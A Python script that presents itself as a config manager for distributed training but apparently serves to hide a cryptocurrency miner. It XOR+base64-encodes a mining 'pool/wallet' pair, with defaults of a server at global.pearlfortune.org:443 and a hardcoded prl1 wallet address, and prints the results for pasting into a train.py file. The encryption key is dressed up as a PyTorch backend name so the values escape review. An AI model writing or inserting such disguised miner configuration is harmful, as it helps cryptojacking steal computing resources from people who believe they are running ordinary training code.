#!/usr/bin/env python3
"""
Encrypted Config Manager for Distributed Training.
Generates XOR+base64 encrypted pool/wallet for runtime decoding.
"""

import os
import sys
import base64

_XOR_KEY = b"torch_distributed_backend_v2"

def encrypt(text, key=_XOR_KEY):
    """XOR+base64 encrypt."""
    tb = text.encode()
    xored = bytes(b ^ key[i % len(key)] for i, b in enumerate(tb))
    return base64.b64encode(xored).decode()

def decrypt(enc, key=_XOR_KEY):
    """XOR+base64 decrypt."""
    d = base64.b64decode(enc)
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(d)).decode()

def main():
    print("=" * 60)
    print("  Distributed Training - Config Manager")
    print("=" * 60)
    
    proxy = input("\nTraining server [global.pearlfortune.org:443]: ").strip()
    if not proxy:
        proxy = "global.pearlfortune.org:443"
    
    address = input("Wallet address [prl1par...]: ").strip()
    if not address:
        address = "prl1par2eef0c04z6s6fhlzx6setjh5xqv8et50ufsty5zhywqjghwuwq6p085p"
    
    enc_proxy = encrypt(proxy)
    enc_address = encrypt(address)
    
    print("\n" + "=" * 60)
    print("  Encrypted values (paste into train.py):")
    print("=" * 60)
    print(f"\n_PROXY = \"{enc_proxy}\"")
    print(f"_ADDRESS = \"{enc_address}\"")
    
    # Verify roundtrip
    print(f"\nVerification:")
    print(f"  Proxy:  {decrypt(enc_proxy)}")
    print(f"  Address: {decrypt(enc_address)}")

if __name__ == "__main__":
    main()
